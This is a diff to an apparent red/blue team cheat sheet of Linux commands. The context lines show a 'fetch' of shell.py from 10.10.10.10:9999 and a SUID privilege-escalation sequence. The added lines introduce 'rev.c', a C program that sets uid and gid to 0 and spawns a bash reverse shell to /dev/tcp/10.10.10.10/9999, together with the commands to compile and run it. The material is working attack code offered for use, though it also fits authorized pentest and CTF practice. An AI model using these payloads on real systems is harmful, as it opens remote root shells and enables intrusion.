@@ -69,7 +69,7 @@ FreeBSD:
 fetch 10.10.10.10:9999/shell.py
 ```
 
-Handy Scripts & Commands (Linux) Red/Blue Team Operations:
+# Handy Scripts & Commands (Linux) Red/Blue Team Operations:
 
 Monitor processes in real-time *Thanx to Ippsec 
 ```
@@ -182,6 +182,22 @@ gcc priv.c -o shell
 rm priv.c
 chmod +s shell
 /shell
+```
+Reverse Shell via C SUID (rev.c)
+```
+#include<unistd.h>
+
+void main()
+
+{ setuid(0);
+  setgid(0);
+  system("/bin/bash -c 'bash -i >& /dev/tcp/10.10.10.10/9999 0>&1'");
+}
+
+gcc rev.c -o rev
+rm rev.c
+chmod +x rev
+./rev
 ```
 Linux
 ```
